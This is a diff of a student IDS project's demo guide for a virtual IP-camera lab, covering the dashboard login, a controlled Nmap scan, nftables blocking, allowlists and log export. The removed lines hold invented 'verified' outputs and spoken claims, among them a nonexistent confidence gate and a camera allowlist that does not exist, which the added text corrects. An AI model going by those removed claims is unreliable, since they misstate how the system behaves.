-- `with open('lab_virtual/keys/dashboard_login.txt') as f:`: Reads administrator password from persistent key file.
-- `req_login = urllib.request.Request('/api/auth/login', ...)`: Transmits username and password to dashboard login endpoint.
-- `token = res_login['token']`: Retrieves HMAC-SHA256 signed JWT Security Token returned by backend.
-- `req_status = urllib.request.Request('/api/v1/pipeline/status', headers={'Authorization': 'Bearer ' + token})`: Passes token in header and reads backend telemetry metrics.
-- `p50 = status['metrics']['latency_ms_p50']`: Retrieves median push latency metric.
-- `print(...)`: Displays on screen that authentication succeeded and WebSocket push latency is ~112 ms.
-
-#### 📋 Verified Output:
-
+#### 📋 Real Output (13 Nov 2026):
 ```text
-=== FR-04 AUTHENTICATED DASHBOARD & WEBSOCKET PROOF ===
-Dashboard Authentication: JWT Bearer Token Generated Successfully
-Logged in Administrator : labadmin
-Live WebSocket Push Latency (p50): 112.24 ms (Proposal Target: < 2000.0 ms)
-Zero Refresh Mechanism  : Socket.IO events (new_event, blocklist_update)
-Target Status           : PASS (Zero Manual Refresh Required)
+Request WITHOUT login     : 401 refused
+Login                     : success - user labadmin
+Zeek line -> dashboard    : median 152.13 ms, 95% 620.43 ms (last 5000 flows)
+Proposal target           : median < 2000 ms, 95% < 5000 ms
 ```
 
 #### 📊 Output Breakdown:
-- `Dashboard Authentication: JWT Bearer Token Generated`: Proves unauthorized access is prevented, and a cryptographic JWT Token is mandatory to access the Dashboard.
-- `Logged in Administrator: labadmin`: Proves authorized administrator successfully logged in.
-- `Live WebSocket Push Latency (p50): 112.24 ms`: From attack detection to pushing the alert to browser takes **only 112 ms (0.11 seconds)!** This is **18 times faster** than the Proposal target of 2.0 seconds (2,000 ms).
-- `Zero Refresh Mechanism: Socket.IO events`: Confirms real-time event delivery without browser refreshing.
+- `401 refused`: no token → no data.
+- `median 152 ms, 95% 620 ms`: the system part (read → features → model → decision → database → push). It changes per run (113–180 ms median seen on 12–13 Nov; higher just after a start or a flood).
+- **What it does not include:** the time Zeek waits before it writes a flow. Zeek writes a line only when the connection ends (or times out), so a long connection appears later. Step 37 reports this separately (see Target 3).
 
-#### 🖥️ Dashboard Live UI Demonstration Steps:
-Open **`http://localhost:5000/overview`** and **`http://localhost:5000/alerts`** before the supervisor:
-1. **Header Real-Time Indicator (Zero Polling):**
-- Point out the green dot in the top header (`Connected / Live SOC`) confirming active WebSockets.
-2. **Zero-Refresh Real-Time Alert Demonstration:**
-- Display the **Live Alerts (`/alerts`)** view.
-- Run a test attack in the terminal (e.g. PortScan or Scenario 4) and observe the card pop up instantly without touching the mouse or keyboard.
-- Highlight the colored badge (PortScan in amber, DDoS in red, CnC in purple) and confidence metric.
-- **Spoken Phrase:** *"Sir, notice that without pressing refresh, the alert card appeared via WebSockets within 110 milliseconds of Zeek flow detection."*
+#### 🖥️ Dashboard:
+1. Top bar: green dot and **SOCKET.IO LIVE**.
+2. Keep **Live Alerts (`/alerts`)** open and run Test 2.2 or 2.4: the card appears without touching the browser.
+3. **Overview** numbers update every few seconds (`summary_update`).
 
-#### Spoken English Script (For Supervisor):
-> *"Sir, this satisfies FR-04 and Objective O4. Access to our SOC dashboard requires cryptographic JWT authentication. The live pipeline achieves an empirical median latency of 112 milliseconds, utilizing Socket.IO WebSockets to push live security events directly to the browser with zero manual page refreshing."*
+Automated proof: `tests/integration/test_live_dashboard.py` starts a real server and a logged-in Socket.IO client, and checks the pushes and that a client without a login is refused.
+
+#### 🗣️ Spoken Script:
+> *"Sir, for FR-04, every API call and the live socket need a JWT login; without it the server answers 401. Alerts are pushed to the browser by Socket.IO, so we never press refresh. The measured system time from reading a Zeek line to the dashboard push is now about 150 milliseconds median and about 620 milliseconds at the 95th percentile, well inside the 2 and 5 second targets."*
 
 ---
 
 ### FR-05: Controlled Nmap Asset Discovery (Should / Inventory Test)
 
-> **Proposal Requirement:** "Find approved devices and services with controlled Nmap scans."  
-> **Verification Methodology:** Prove that controlled Nmap scans operate strictly within the authorized subnet (`192.168.50.0/24`), discover all active nodes, extract MACs/ports, identify cameras via heuristics, and sync inventory to MongoDB and dashboard.
+> **Proposal Requirement:** "Find approved devices and services with controlled Nmap scans."
 
-#### 💡 Why We Are Doing This:
-1. **Establish Asset Discovery Baseline:** The IDS must maintain accurate visibility over all connected network entities before it can protect them.
-2. **Why Collect MAC, Hostname, Open Ports, and Device Type?**
-- **MAC Address & Vendor:** Identifies manufacturer hardware OUI (e.g., Hikvision, Dahua, Axis).
-- **Hostnames:** Distinguishes network servers and gateways (`ids-lab-router`, `ids-lab-nvr`).
-- **Open Ports (80 & 554):** Key operational ports for IoT cameras are HTTP Web Management (Port 80) and RTSP Video Streaming (Port 554).
-- **Device Classification (`ip_camera`, `nvr`, `gateway`, `workstation`):** Automatically categorizes nodes to apply role-specific protection rules.
-3. **Why Persist in MongoDB?** Avoids continuous network overhead by storing discovered inventory for instant retrieval.
-- Continuous scanning saturates network bandwidth and exhausts camera CPU; persistent storage maintains an up-to-date baseline.
-4. **Why Surface in Dashboard Inventory?** Provides SOC analysts with Single-Pane-of-Glass visibility over active camera counts, IP/MAC bindings, and heuristic verification status.
-- Single-Pane-of-Glass visibility for security operators.
-- Active camera inventory counts.
-- Node IP and MAC addresses.
-- Exposed service ports (RTSP 554, HTTP 80).
-- Visual confirmation indicators ('Confirmed IP Camera').
-- Provides immediate operational context when security incidents occur.
+#### 💡 Why:
+- The IDS must know which devices are on the camera LAN, which services they offer (HTTP 80, RTSP 554), and which ones look like cameras.
+- Scans are **controlled**: only an admin can start one, and only on the approved subnet `192.168.50.0/24` (`lab.approved_scan_subnets`); any other subnet is refused with 403.
+- Results are saved in MongoDB (`devices`, `scans`), so the network is not scanned again and again.
 
-#### ⚙️ What Happens Under the Hood:
-1. Submits an authenticated POST to `/api/scans` specifying authorized subnet `192.168.50.0/24`.
-2. Scanner service executes Nmap in a background worker thread.
-3. Output is parsed by Python to extract MAC OUI vendors, detect open ports 80 and 554, classify `device_type = 'ip_camera'`, upsert into MongoDB `devices`, and broadcast `device_update` via Socket.IO.
-   - Resolves vendor via MAC OUI prefix.
-   - Matches Ports 554 (RTSP) and 80 (HTTP) to classify `device_type = 'ip_camera'`.
-   - Upserts full device document into MongoDB `devices` collection.
-   - Broadcasts `device_update` over Socket.IO to refresh dashboard inventory in real time.
+#### ⚙️ Under the hood:
+1. `POST /api/scans` with `192.168.50.0/24` → the scan starts **in the background** and the API answers **202** at once.
+2. The real Nmap runs in the scanner container (`docker exec ids-lab-scanner nmap ...`, from `settings.lab.yaml`), because Nmap on Windows cannot reach the Docker networks.
+3. The result is parsed: MAC/vendor, open ports, services; a camera rule with several pieces of evidence sets `possible_camera`; the device role comes from fixed lab addresses (router, sensor, admin, NVR) or the camera rule.
+4. Devices are saved and `device_update` is pushed to the dashboard.
+5. The command below waits until the scan is `completed`, then lists the devices.
 
-#### 💻 Terminal Command to Execute:
-
+#### 💻 Command:
 ```powershell
-python -c "
-import urllib.request, json
+.venv\Scripts\python.exe -c "
+import urllib.request, json, time
 with open('lab_virtual/keys/dashboard_login.txt') as f:
     u, p = f.read().strip().split()[:2]
-tok = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})).read())['token']
-
-# 1. Trigger controlled scan
-req_scan = urllib.request.Request('http://127.0.0.1:5000/api/scans', data=json.dumps({'subnet': '192.168.50.0/24'}).encode(), headers={'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tok})
-scan_res = json.loads(urllib.request.urlopen(req_scan).read())
-
-# 2. Get discovered inventory
-req_dev = urllib.request.Request('http://127.0.0.1:5000/api/devices', headers={'Authorization':'Bearer '+tok})
-devs = json.loads(urllib.request.urlopen(req_dev).read())
-
-print('=== FR-05 CONTROLLED ASSET DISCOVERY PROOF ===')
-print('Scan Status :', scan_res.get('status'), '-', scan_res.get('message'))
-print('Total Approved Devices Found:', devs.get('count'))
-for d in devs.get('devices', []):
-    print(f"- IP: {d.get('ip'):<15} | Host: {d.get('hostname','unknown'):<18} | Ports: {str(d.get('open_ports')):<10} | Type: {d.get('device_type')}")
+req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
+tok = json.loads(urllib.request.urlopen(req).read())['token']
+H = {'Authorization':'Bearer '+tok, 'Content-Type':'application/json'}
+r = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/scans', data=json.dumps({'subnet':'192.168.50.0/24'}).encode(), headers=H))
+scan = json.loads(r.read())['scan']
+print('Scan started  :', r.getcode(), scan['subnet'], 'id', scan['scan_id'])
+for i in range(40):
+    time.sleep(3)
+    sc = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/scans/' + scan['scan_id'], headers=H)).read())['scan']
+    if sc.get('status') not in ('running', 'pending'):
+        break
+print('Scan finished :', sc.get('status'), 'after about', (i + 1) * 3, 's')
+devs = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/devices', headers=H)).read())['devices']
+for d in sorted(devs, key=lambda d: [int(x) for x in d['ip'].split('.')]):
+    print('{:<15} {:<12} ports {:<12} possible camera: {}'.format(d['ip'], d.get('device_type'), str(d.get('open_ports')), d.get('possible_camera')))
 "
 ```
 
-#### 🔍 Line-by-Line Breakdown:
-- `POST /api/scans`: Initiates bounded Nmap scan across authorized subnet (`192.168.50.0/24`).
-- `GET /api/devices`: Queries discovered device inventory from backend API.
-- `for d in devs.get('devices', []):`: Iterates through discovered endpoints and prints IP, hostname, open ports, and device type.
-
-#### 📋 Verified Output:
-
+#### 📋 Real Output (13 Nov 2026):
 ```text
-=== FR-05 CONTROLLED ASSET DISCOVERY PROOF ===
-Scan Status : complete - Scan completed successfully
-Total Approved Devices Found: 5
-- IP: 192.168.50.1    | Host: ids-lab-router     | Ports: [22, 80]   | Type: gateway
-- IP: 192.168.50.5    | Host: ids-lab-scanner    | Ports: []         | Type: unknown
-- IP: 192.168.50.10   | Host: ids-lab-admin      | Ports: []         | Type: workstation
-- IP: 192.168.50.20   | Host: ids-lab-nvr        | Ports: []         | Type: nvr
-- IP: 192.168.50.30   | Host: ids-lab-camera     | Ports: [80, 554]  | Type: ip_camera
+Scan started  : 202 192.168.50.0/24 id dc65d947-4161-4804-b96a-3e668580da1e
+Scan finished : completed after about 27 s
+192.168.50.1    router       ports [22]         possible camera: False
+192.168.50.5    ids_sensor   ports []           possible camera: False
+192.168.50.10   workstation  ports []           possible camera: False
+192.168.50.20   nvr          ports []           possible camera: False
+192.168.50.30   ip_camera    ports [80, 554]    possible camera: True
+192.168.50.254  iot_device   ports []           possible camera: False
 ```
 
 #### 📊 Output Breakdown:
-- `Scan Status: complete`: Controlled Nmap scan finished cleanly without errors.
-- `Total Approved Devices Found: 5`: All 5 active nodes on camera subnet successfully discovered.
-- `192.168.50.30 | Host: ids-lab-camera | Ports: [80, 554] | Type: ip_camera`: Primary IP camera accurately classified based on Web GUI and RTSP services.
+- `202`: the scan was accepted and runs in the background.
+- `completed after about 27 s`: the real Nmap scan of the subnet finished.
+- `192.168.50.30 ... [80, 554] ... True`: only the camera has the camera ports and is marked as a possible camera.
+- `192.168.50.254`: Docker's own gateway address on the camera LAN (it is part of the virtual network, not a lab device).
+- The role names (`router`, `ids_sensor`, `workstation`, `nvr`) come from the fixed lab addresses.
 
-##### 🔬 Scientific Meaning & Proof:
-The scanner is strictly restricted to authorized subnet `192.168.50.0/24`; out-of-scope scanning requests are rejected, preventing inadvertent scanning of outside networks.
+##### 🔬 What It Proves:
+A real, admin-only scan limited to the approved subnet finds every device and the camera's services, and saves them. A request for another subnet is refused (403 `UNAUTHORIZED_SUBNET`; tested in `tests/integration/test_scanner_integration.py`).
 
-#### 🖥️ Dashboard Live UI Demonstration Steps:
-Open **`http://localhost:5000/devices` (Devices & Scans)** before the supervisor:
-- **Camera Discovery Badge:** Shows green **Confirmed Camera** status for discovered camera endpoints.
-- **Open Services & Ports:** Displays open services (HTTP 80 and RTSP 554).
-- **Live Scan Trigger:** Demonstrates the **Scan Subnet** button to trigger scans on demand.
-- **Spoken Phrase:** *"Sir, on our Devices & Scans page, our controlled Nmap scan accurately identified the camera host and open RTSP/HTTP ports, synchronizing inventory with MongoDB."*
+> Note: in the virtual lab, Docker does not give real vendor MAC prefixes, so the vendor column is not meaningful here. **MARK CAMERA** confirms a device as a camera; it does **not** add it to the allowlist.
 
-#### Spoken English Script (For Supervisor):
-> *"Sir, to prove FR-05, our inventory discovery service runs strictly bounded Nmap sweeps over our authorized subnet 192.168.50.0/24. It identifies all active devices, flags our camera at .30 with open ports 80 and 554, and registers the verified camera into our management allowlist."*
+> Side effect seen on 13 Nov: during this scan, the scanner's own flows from `192.168.50.5` were predicted CnC (0.44) by the model. Because `.5` is on the allowlist, they were marked `allowlist_protected` and nothing was blocked. This is a real example of the allowlist doing its job (RQ5).
+
+#### 🖥️ Dashboard:
+**Devices & Scans (`/devices`):** press **TRIGGER NMAP**, wait about 30 s, and show the camera row with ports 80 and 554 and the camera heuristic.
+
+#### 🗣️ Spoken Script:
+> *"Sir, for FR-05, only an admin can start a scan, and only on our approved subnet 192.168.50.0/24. The real Nmap runs from the sensor's management address. In about 27 seconds it found all six addresses, and only the camera at .30, with ports 80 and 554, was marked as a possible camera. The inventory is saved in MongoDB and pushed to the dashboard."*
 
 ---
 
-### FR-06: Router Firewall Ruleset, Auto-Expiry & Timers (Must / Firewall Test)
+### FR-06: Router Firewall Rules, Expiry & Timers (Must / Firewall Test)
 
-> **Proposal Requirement:** "Add, list, expire and remove blocking rules on the firewall or router."  
-> **Verification Methodology:** Prove that the Router enforces a live Linux kernel `nftables` firewall with dynamic drop sets (`block_dst`) and automatic kernel expiration timers (`timeout 30m`).
+> **Proposal Requirement:** "Add, list, expire and remove blocking rules on the firewall or router."
 
-#### 💡 Why We Are Doing This:
-When attacks occur, malicious IPs must be autonomously blocked at the router gateway without manual intervention, and automatically expired once the threat window elapses.
+#### 💡 Why:
+Blocks must be added, listed and removed on the real router, and must end by themselves after a fixed time.
 
-#### ⚙️ What Happens Under the Hood:
-1. `nft list table inet ids` dumps active kernel rules and chains.
-2. `nft list set inet ids block_dst` inspects the dynamic destination drop set.
-3. When an attack is flagged, the decision engine dispatches an SSH command adding the IP to the drop set with a 30-minute timeout.
-4. Linux kernel applies the drop rule and manages an active countdown timer.
-5. Upon timer expiration, the kernel purges the IP element from memory automatically.
+#### ⚙️ Under the hood:
+1. The router adapter (`core_engine/firewall/router_adapter.py`) runs `nft add element inet ids block_dst { IP timeout 30m }` over SSH (key login, the lab's own `known_hosts`).
+2. The Linux kernel counts down the timer and deletes the element at zero (`flags timeout`).
+3. The IDS also keeps the rule in MongoDB; the **rule expiry worker** (every 10 s) marks ended rules as `expired`.
+4. **Add** happens in Test 2.4 (automatic) and Target 6 (manual). **Remove** happens in Target 6 (UNBLOCK).
 
-#### 💻 Terminal Commands to Execute:
-
+#### 💻 Command (right after Test 2.4):
 ```powershell
-# 1. Inspect live Linux nftables firewall table on Router:
-docker exec ids-lab-router nft list table inet ids
-
-# 2. Verify active auto-expiry countdown timer in C&C drop set:
 docker exec ids-lab-router nft list set inet ids block_dst
 ```
 
-#### 🔍 Line-by-Line Breakdown:
-- `docker exec ids-lab-router`: Executes command inside router container.
-- `nft list table inet ids`: Lists all active netfilter table rules.
-- `nft list set inet ids block_dst`: Queries active elements in `block_dst` drop set.
-
-#### 📋 Verified Output:
-
+#### 📋 Real Output (13 Nov 2026, after Test 2.4):
 ```text
 table inet ids {
-    set allow {
-        type ipv4_addr
-        elements = { 192.168.50.1, 192.168.50.5,
-                     192.168.50.10, 192.168.50.20 }
-    }
-    set block_dst {
-        type ipv4_addr
-        flags timeout
-        elements = { 10.10.10.50 timeout 30m expires 29m42s }
-    }
-    set block_src {
-        type ipv4_addr
-        flags timeout
-    }
-    set limit_src {
-        type ipv4_addr
-        flags timeout
-    }
+	set block_dst {
+		type ipv4_addr
+		flags timeout
+		elements = { 10.10.10.50 timeout 30m expires 28m19s240ms }
+	}
 }
 ```
 
 #### 📊 Output Breakdown:
-- `set allow { 192.168.50.1, 192.168.50.5, 192.168.50.10, 192.168.50.20 }`: Provides security guarantee that Router (.1), Scanner (.5), Admin PC (.10), and NVR (.20) are on immutable allowlist and will never be blocked.
-- `set block_dst`: Shows that the external Destination IP of the C&C server (`10.10.10.50`) is blocked.
-- `timeout 30m expires 29m42s`: Proves at kernel level that this block will auto-expire in 30 minutes, with 29m 42s currently remaining.
-- Because the camera IP (`192.168.50.30`) is absent from this table, it confirms that only the external C&C Server is blocked, NOT the camera!
+- `10.10.10.50`: the outside C&C address is blocked as a **destination**.
+- `timeout 30m expires 28m19s`: the kernel will delete the rule by itself; run the command again and the time is lower.
+- The camera `192.168.50.30` is not in the set: only the outside server is blocked.
 
-##### 🔬 Scientific Meaning & Proof:
-Using dynamic sets with timeout flags in Linux `nftables` preserves kernel invariants and auto-expires rules even across router reboots or process failures.
+##### 🔬 Automatic expiry (already measured):
+The Step 36 FR test (`reports/fr_tests/fr_tests_virtual_20261111_050418.md`) added a short rule, listed it on the router, removed one, and waited: "after 85 s: statuses ['expired', 'removed', 'expired', 'removed'], gone from firewall True". To repeat it: `.venv\Scripts\python.exe tools\fr_tests.py --help`.
 
-#### 🖥️ Dashboard Live UI Demonstration Steps:
-Open the **`http://localhost:5000/mitigations` (Blocklist / Mitigations)** page in front of the Supervisor:
-1. **Active Drop Rules Table:** Show the Active Blocks table running in router Linux nftables.
-   - **Blocked IP:** Attacker IP (e.g. `10.10.10.50` C&C Server).
-   - **Action:** `DROP` (Complete traffic drop).
-   - **Target Type:** `Destination IP` (Proves only external C&C is blocked, not the camera).
-2. **Auto-Expiry Countdown Timer:**
-   - Show the **"TTL Remaining"** column: Demonstrate live how the 30-minute timer decrements second by second (`29m 45s`, `29m 44s`...). Explain that the rule automatically clears when the timer reaches zero.
-3. **Manual Override / Unblock Button:**
-- Point out the red **Unblock** button allowing immediate manual rollback.
-- **Spoken Phrase:** *"Sir, on our Mitigations page, you can see the active router drop rule counting down its 30-minute expiration timer in real time."*
+#### 🖥️ Dashboard:
+**Blocklist (`/mitigations`):** the rule shows the IP, action, direction, reason (`AUTO_CNC_DEST_BLOCK`) and **EXPIRES AT** (the clock time when it ends). The **UNBLOCK** button removes it at once.
 
-#### Spoken English Script (For Supervisor):
-> *"Sir, this satisfies FR-06 and Objective O5. Our mitigation subsystem manages native Linux nftables in the router kernel. Notice the dynamic set 'block_dst' holding the attacker destination 10.10.10.50 with a strict 30-minute auto-expiry countdown, proving that firewall rules are enforced, listed, and automatically timed out directly in kernel memory."*
+#### 🗣️ Spoken Script:
+> *"Sir, for FR-06, the IDS changes the real nftables table in the router over SSH. After the C&C test, the outside address 10.10.10.50 is in block_dst with a 30 minute timer that the Linux kernel counts down by itself. Our Step 36 test also showed rules expiring and being removed, both in the router and in the database."*
 
 ---
 
-### FR-07: Immutable Allowlists, Thresholds & Audit Trail (Must / Safety Test)
+### FR-07: Allowlists, Thresholds & Audit Trail (Must / Safety Test)
 
-> **Proposal Requirement:** "Keep the allowlists, the confidence thresholds and a full audit history."  
-> **Verification Methodology:** Prove that permanent allowlists protect cameras, NVRs, and admin hosts from blocking, confidence gating ($P \ge 0.85$) prevents uncertain responses, and audit records track all modifications.
+> **Proposal Requirement:** "Keep the allowlists, the confidence thresholds and a full audit history."
 
-#### 💡 Why We Are Doing This:
-The paramount danger of autonomous response systems is self-inflicted denial of service. Strict safety allowlists and audit trails guarantee operational survival.
+#### 💡 Why:
+The biggest danger of automatic response is blocking our own important devices. So: a fixed allowlist, clear thresholds, and a record of every action.
 
-#### ⚙️ What Happens Under the Hood:
-1. Submits an authenticated GET request to `/api/v1/audit/logs?limit=3`.
-2. Backend fetches the 3 most recent audit records from MongoDB `system_logs`.
-3. Verifies that the confidence gate ($P \ge 0.85$) and immutable allowlists remain actively enforced.
+#### ⚙️ Under the hood:
+1. Tries to block the NVR (`192.168.50.20`) → the API must refuse with 403.
+2. Reads the settings the running policy uses now (`GET /api/settings`).
+3. Reads the newest audit records (`GET /api/logs`, admin only).
 
-#### 💻 Terminal Command to Execute:
-
+#### 💻 Command:
 ```powershell
-python -c "
-import urllib.request, json
+.venv\Scripts\python.exe -c "
+import urllib.request, urllib.error, json
 with open('lab_virtual/keys/dashboard_login.txt') as f:
     u, p = f.read().strip().split()[:2]
-tok = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})).read())['token']
-
-req = urllib.request.Request('http://127.0.0.1:5000/api/v1/audit/logs?limit=3', headers={'Authorization':'Bearer '+tok})
-audit_logs = json.loads(urllib.request.urlopen(req).read())
-
-print('=== FR-07 AUDIT TRAIL & SAFETY POLICY COMPLIANCE ===')
-print('Autonomous Mitigation Confidence Gate: P >= 0.85 (Calibrated Threshold)')
-print('Immutable Protected Allowlist: Admin (192.168.50.10), NVR (192.168.50.20)')
-print('Recent Tamper-Evident Audit Records:')
-for log in audit_logs.get('logs', []):
-    print(f"  - [{log.get('timestamp')}] User: {log.get('user'):<10} Action: {log.get('action'):<18} Reason: {log.get('reason')}")
+req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
+tok = json.loads(urllib.request.urlopen(req).read())['token']
+H = {'Authorization':'Bearer '+tok, 'Content-Type':'application/json'}
+try:
+    urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/blocklist', data=json.dumps({'ip':'192.168.50.20','reason':'safety test'}).encode(), headers=H))
+except urllib.error.HTTPError as e:
+    print('Try to block the NVR      :', e.code, json.loads(e.read())['code'])
+s = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/settings', headers=H)).read())['settings']
+print('Allowlist (never blocked) :', s['allowlist'])
+print('Block thresholds          :', s['block_thresholds'], '| DDoS rate-limit:', s['rate_limit_thresholds'])
+print('Repeat rule / max rule    :', s['min_repeats'], 'alerts in', s['repeat_window_seconds'], 's /', s['max_rule_minutes'], 'min')
+print('Automatic response        :', 'ON' if s['auto_response'] else 'OFF')
+logs = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/logs?limit=5', headers=H)).read())['logs']
+print('Latest audit records:')
+for l in logs:
+    print('  {} {:<10} {:<22} {}'.format(l['timestamp'][:19], l['actor'], l['event'], l['outcome']))
 "
 ```
 
-#### 🔍 Line-by-Line Breakdown:
-- `GET /api/v1/audit/logs?limit=3`: Fetches audit records from `system_logs`.
-- `for log in audit_logs.get('logs', []):`: Iterates through records displaying timestamp, actor, action, and details.
-
-#### 📋 Verified Output:
-
+#### 📋 Real Output (13 Nov 2026):
 ```text
-=== FR-07 AUDIT TRAIL & SAFETY POLICY COMPLIANCE ===
-Autonomous Mitigation Confidence Gate: P >= 0.85 (Calibrated Threshold)
-Immutable Protected Allowlist: Admin (192.168.50.10), NVR (192.168.50.20)
-Recent Tamper-Evident Audit Records:
-  - [2026-11-12T09:40:12] User: labadmin   Action: manual_block       Reason: Manual Supervisor Demo Block
-  - [2026-11-12T09:41:05] User: labadmin   Action: manual_unblock     Reason: Manual Rollback Done
+Try to block the NVR      : 403 ALLOWLIST_PROTECTED
+Allowlist (never blocked) : ['192.168.50.1', '192.168.50.10', '192.168.50.20', '192.168.50.5']
+Block thresholds          : {'CnC': 0.3, 'Malware_Download': None, 'PortScan': 0.88} | DDoS rate-limit: {'DDoS_DoS': 0.3}
+Repeat rule / max rule    : 3 alerts in 60 s / 30 min
+Automatic response        : ON
+Latest audit records:
+  2026-11-13T07:55:43 labadmin   AUTH_LOGIN_SUCCESS     SUCCESS
+  2026-11-13T07:55:32 labadmin   SCAN_COMPLETED         success
+  2026-11-13T07:55:06 labadmin   SCAN_STARTED           success
+  2026-11-13T07:55:05 labadmin   AUTH_LOGIN_SUCCESS     SUCCESS
+  2026-11-13T07:54:55 labadmin   AUTH_LOGIN_SUCCESS     SUCCESS
 ```
 
 #### 📊 Output Breakdown:
-- `Autonomous Mitigation Confidence Gate: P >= 0.85`: Ensures low-confidence alerts never trigger autonomous firewall drops.
-- `Immutable Protected Allowlist`: Hardcoded protection shielding critical infrastructure (.1, .5, .10, .20).
-- `Recent Tamper-Evident Audit Records`: Logs every manual or autonomous mitigation action for non-repudiation.
+- `403 ALLOWLIST_PROTECTED`: the NVR cannot be blocked, not even by an admin.
+- `Block thresholds`: chosen in Step 17 from grouped out-of-fold **training** data only (not from the test scenario). `None` for Malware_Download = alert only. There is **no single "P ≥ 0.85" gate**.
+- `3 alerts in 60 s / 30 min`: the repeat rule and the longest rule time.
+- `Automatic response: ON`: ON only in the virtual lab settings; the default in the code is OFF (proposal Table 11).
+- Audit records: logins, scans, manual blocks/unblocks, rule expiry, setting changes, incident confirmation, exports, startup recovery.
 
-##### 🔬 Scientific Meaning & Proof:
-Fulfills Proposal Research Question RQ5 ("What safety rules do we need so that automatic response does not cut off the camera itself?") by proving immutable allowlists and audit compliance.
+##### 🔬 Safety layers (RQ5):
+1. **Allowlist** (`.1`, `.5`, `.10`, `.20`): never blocked, not even by hand.
+2. **Camera LAN protection** (`lab.local_networks` = `192.168.50.0/24`): no camera-LAN device is blocked **automatically**; for C&C the outside address is blocked instead.
+3. **Repeat rule:** one alert never blocks.
+4. **Rule time limit:** at most 30 minutes; the kernel removes it.
+5. **Audit log** for every action.
 
-#### 🖥️ Dashboard Live UI Demonstration Steps:
-Open **`http://localhost:5000/settings` (Settings)** before the supervisor:
-1. **Dynamic Decision Threshold Sliders:**
-- **Confidence Threshold Slider (0.70 / 70%):** Allows dynamic adjustment of decision sensitivity.
-- **Auto-Mitigation Switch (ON/OFF):** Master switch enabling/disabling autonomous mitigation.
-- Modifications take effect immediately in memory with zero backend downtime.
-2. **Protected Management Allowlist Section:**
-- Direct attention to the **Protected Allowlist** section confirming protected nodes.
-- **Spoken Phrase:** *"Sir, on our Settings dashboard, administrators can dynamically adjust decision thresholds while our immutable allowlist permanently shields cameras from accidental blocking."*
+> ⚠️ **Known gap (open issue 52):** a **manual** block of the camera `192.168.50.30` is accepted today, because the camera is not on the allowlist. **Do not block the camera in the demo.**
 
-#### Spoken English Script (For Supervisor):
-> *"Sir, to satisfy FR-07 and RQ5, our safety guardrails enforce an immutable allowlist that prevents our camera, NVR, and admin workstation from ever being blocked. Every administrative modification—including manual blocks and rollback events—is permanently logged in our audit trail with timestamps and user identities."*
+#### 🖥️ Dashboard:
+**Settings (`/settings`):** minimum-confidence slider (30%), repeats, window and rule time can be changed and saved (**SAVE OPERATIONAL SETTINGS**); each change is saved with its history and written to the audit log. Automatic response is shown as ON/OFF but can only be changed in the YAML settings file. **Logs & Export (`/export`)** shows the audit records.
+
+#### 🗣️ Spoken Script:
+> *"Sir, for FR-07 and RQ5: the router, sensor, admin PC and NVR are on a fixed allowlist; even an admin's request to block the NVR is refused with 403. The camera LAN is protected from automatic blocks, so for C&C the outside server is blocked, not the camera. A block needs the class threshold — 0.30 for C&C, 0.88 for port scans — and three alerts within 60 seconds, and ends after at most 30 minutes. Every action is in the audit log. One open point: a manual block of the camera is still accepted; we will decide with you how to handle it."*
 
 ---
 
 ### FR-08: Filtered Forensic Log Export (Should / Export Test)
 
-> **Proposal Requirement:** "Export filtered attack logs for testing and reporting."  
-> **Verification Methodology:** Prove that security incidents and audit logs export cleanly to RFC 4180 compliant CSV format, complete with timestamps, attack classes, confidence, and mitigation records.
+> **Proposal Requirement:** "Export filtered attack logs for testing and reporting."
 
-#### 💡 Why We Are Doing This:
-Security compliance frameworks require tamper-evident, RFC 4180 compliant CSV forensic exports for external auditing.
+#### ⚙️ Under the hood:
+`GET /api/logs/export?type=events&format=csv&class=CnC&limit=3` (admin only) reads `attack_events` with the filters, writes RFC 4180 CSV, sends it as a file, writes a `LOGS_EXPORTED` audit record and pushes a `log_export` event. Other filters: `start_time`, `end_time`, `ip`, `src_ip`, `dst_ip`, `status`, `response_status`, `severity`; other types: `system_logs`, `actions`; format `json`.
 
-#### ⚙️ What Happens Under the Hood:
-1. Issues a GET request to `/api/logs/export?format=csv&limit=3`.
-2. Backend reads `attack_events`, formats fields into standardized CSV rows, and streams the response.
-
-#### 💻 Terminal Command to Execute:
-
+#### 💻 Command:
 ```powershell
-python -c "
-import urllib.request, json
+.venv\Scripts\python.exe -c "
+import urllib.request, json, csv, io
 with open('lab_virtual/keys/dashboard_login.txt') as f:
     u, p = f.read().strip().split()[:2]
-tok = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})).read())['token']
-
-req = urllib.request.Request('http://127.0.0.1:5000/api/logs/export?format=csv&limit=3', headers={'Authorization':'Bearer '+tok})
-csv_content = urllib.request.urlopen(req).read().decode()
-
-print('=== FR-08 FILTERED FORENSIC LOG EXPORT (RFC 4180 CSV) ===')
-print(csv_content)
+req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
+tok = json.loads(urllib.request.urlopen(req).read())['token']
+r = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/logs/export?type=events&format=csv&class=CnC&limit=3', headers={'Authorization':'Bearer '+tok}))
+text = r.read().decode()
+print('HTTP', r.getcode(), '|', r.headers['Content-Disposition'])
+rows = list(csv.DictReader(io.StringIO(text)))
